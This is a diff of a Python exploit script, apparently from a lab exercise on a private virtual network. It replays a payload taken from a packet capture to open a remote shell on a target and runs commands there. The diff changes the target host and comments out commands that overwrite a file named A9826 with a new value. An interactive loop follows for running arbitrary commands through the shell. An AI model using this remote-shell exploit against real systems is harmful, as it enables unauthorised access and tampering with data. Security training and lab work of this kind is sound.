@@ -1,7 +1,7 @@
 import socket
 from binascii import a2b_hex
 
-host = '192.168.56.102'
+host = '192.168.56.101'
 port = 5000
 
 # the base_payload comes from the .pcap file
@@ -47,21 +47,21 @@ s.send(b'uname\n')
 out = s.recv(4096)
 print("Output from uname: ", out.decode())
 
-s.send(b'chmod u+w A9826\n')
-out = s.recv(4096)
-print("Output from instruction: ", out.decode())
-
-s.send(b'echo 1000000 > A9826\n')
-out = s.recv(4096)
-print("Output from instruction: ", out.decode())
-
-s.send(b'chmod u-w A9826\n')
-out = s.recv(4096)
-print("Output from instruction: ", out.decode())
-
-s.send(b'exit\n')
-out = s.recv(4096)
-print("Output from instruction: ", out.decode())
+# s.send(b'chmod u+w A9826\n')
+# out = s.recv(4096)
+# print("Output from instruction: ", out.decode())
+#
+# s.send(b'echo 1000000 > A9826\n')
+# out = s.recv(4096)
+# print("Output from instruction: ", out.decode())
+#
+# s.send(b'chmod u-w A9826\n')
+# out = s.recv(4096)
+# print("Output from instruction: ", out.decode())
+#
+# s.send(b'exit\n')
+# out = s.recv(4096)
+# print("Output from instruction: ", out.decode())
 
 # if the shell is open, we can execute whatever we want
 while True:
